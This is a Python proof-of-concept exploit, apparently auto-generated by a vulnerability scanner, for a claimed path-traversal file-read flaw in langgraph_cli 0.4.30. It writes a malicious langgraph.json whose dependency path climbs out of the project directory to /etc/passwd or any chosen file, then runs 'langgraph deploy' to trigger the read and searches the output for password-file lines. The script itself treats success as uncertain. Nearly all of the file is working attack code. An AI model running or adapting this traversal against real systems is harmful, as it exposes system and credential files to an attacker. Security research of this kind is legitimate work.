#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli/langgraph_cli-0.4.30)
# Path: suspicious-005
# Sink: create_archive
# Auto-generated — run with: python3 lfi_allows_who_controls_langgraph_create_archive.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: LFI via path traversal in langgraph_cli-0.4.30

Vulnerability: The `find_tracked_packages` function reads dependency paths from
`langgraph.json` without sanitization, allowing an attacker to read arbitrary files
via `../` traversal.

This PoC creates a malicious `langgraph.json` that reads `/etc/passwd` and
triggers the vulnerable code path via `langgraph deploy`.
"""

import os
import sys
import json
import tempfile
import subprocess
import shutil
import argparse

def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langgraph_cli-0.4.30"
    )
    parser.add_argument(
        "--target",
        default="/etc/passwd",
        help="File to read via path traversal (default: /etc/passwd)"
    )
    parser.add_argument(
        "--output",
        default=None,
        help="Save output to file (default: print to stdout)"
    )
    args = parser.parse_args()

    # Create a temporary directory to simulate a project
    tmpdir = tempfile.mkdtemp(prefix="langgraph_poc_")
    print(f"[*] Created working directory: {tmpdir}")

    try:
        # Create a minimal Python file to satisfy langgraph
        agent_file = os.path.join(tmpdir, "agent.py")
        with open(agent_file, "w") as f:
            f.write("# dummy agent\n")

        # Create malicious langgraph.json with path traversal
        # The dependency path uses ../ to escape the project directory
        config = {
            "dependencies": [
                # Traverse up from project dir to read target file
                # We need to go up enough levels to reach root, then to target
                # Since config is in tmpdir, we go up to / and then to target
                f"../../../../../../..{args.target}"
            ],
            "graphs": {
                "test": "./agent.py"
            }
        }

        config_path = os.path.join(tmpdir, "langgraph.json")
        with open(config_path, "w") as f:
            json.dump(config, f, indent=2)
        print(f"[*] Created malicious langgraph.json at: {config_path}")
        print(f"[*] Target file: {args.target}")

        # Run langgraph deploy to trigger the vulnerability
        # We expect it to fail, but the file read should happen before failure
        print("[*] Running 'langgraph deploy' to trigger LFI...")
        result = subprocess.run(
            ["langgraph", "deploy", "--config", config_path],
            cwd=tmpdir,
            capture_output=True,
            text=True,
            timeout=30
        )

        # Check output for signs of file content
        output = result.stdout + result.stderr
        print(f"[*] Command exit code: {result.returncode}")
        print(f"[*] Command output:\n{output[:2000]}")

        # The vulnerability may cause an error, but the file content might appear
        # in error messages or warnings
        if args.target in output:
            print("[!] Target file path found in output - LFI likely succeeded")
        
        # Look for common file content patterns
        if "root:" in output or "nobody:" in output:
            print("[!] Found /etc/passwd content in output - LFI confirmed!")
        
        # Save output if requested
        if args.output:
            with open(args.output, "w") as f:
                f.write(output)
            print(f"[*] Output saved to: {args.output}")

    except subprocess.TimeoutExpired:
        print("[!] Command timed out - this may indicate successful exploitation")
    except FileNotFoundError:
        print("[!] 'langgraph' command not found. Is langgraph_cli installed?")
        print("    Install with: pip install langgraph-cli==0.4.30")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        # Cleanup
        shutil.rmtree(tmpdir, ignore_errors=True)
        print(f"[*] Cleaned up working directory")

if __name__ == "__main__":
    main()
